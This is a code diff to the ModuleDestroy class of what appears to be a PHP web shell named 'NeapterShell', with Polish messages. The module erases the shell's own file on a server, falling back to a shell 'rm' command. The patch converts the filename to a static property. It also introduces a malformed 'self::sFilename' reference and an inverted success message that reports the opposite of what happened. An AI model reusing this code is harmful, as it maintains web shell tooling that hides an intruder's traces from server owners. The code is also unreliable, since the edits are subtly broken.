@@ -35,9 +35,10 @@ class ModuleDestroy extends ModuleAbstract
     /**
      * File to remove
      *
-     * @var string
+     * @static
+     * @var    string
      */
-    protected $sFilename;
+    protected static $sFilename;
 
     /**
      * Constructor, check if posix_getpwuid and posix_getgrgid exist
@@ -104,7 +105,7 @@ Trwałe usunięcie NeapterShell. Plik %s zostanie usunięty wraz z wszystkimi pl
         remove key - trwałe usunięcie shella
 DATA;
 
-        return sprintf($sHelp, $this->sFilename);
+        return sprintf($sHelp, self::sFilename);
     }
 
     /**
@@ -117,17 +118,17 @@ DATA;
         if ($this->oArgs->getNumberOfParams() === 0) {
             return sprintf(
                 "W celu usunięcia shell wprowadź \"%s\" jako parametr",
-                $sKey
+                $this->sKey
             );
         }
 
         if (($this->oArgs->getParam(0) === $this->sKey)) {
             $this->oUtils->cacheFlush();
 
-            if (! @unlink($this->sFilename)) {
+            if (! @unlink(self::$sFilename)) {
                 /* Try to remove using system command */
                 if ($this->oUtils->isExecutable()) {
-                    $sCmd = sprintf('rm "%s"', $this->sFilename);
+                    $sCmd = sprintf('rm "%s"', self::$sFilename);
 
                     $this->oShell->getCommandOutput($sCmd);
                 }
@@ -137,7 +138,7 @@ DATA;
 
             return sprintf(
                 'Shell %szostał usunięty',
-                (is_file($this->sFilename) ? '' : 'nie ')
+                (is_file(self::$sFilename) ? '' : 'nie ')
             );
         }
 
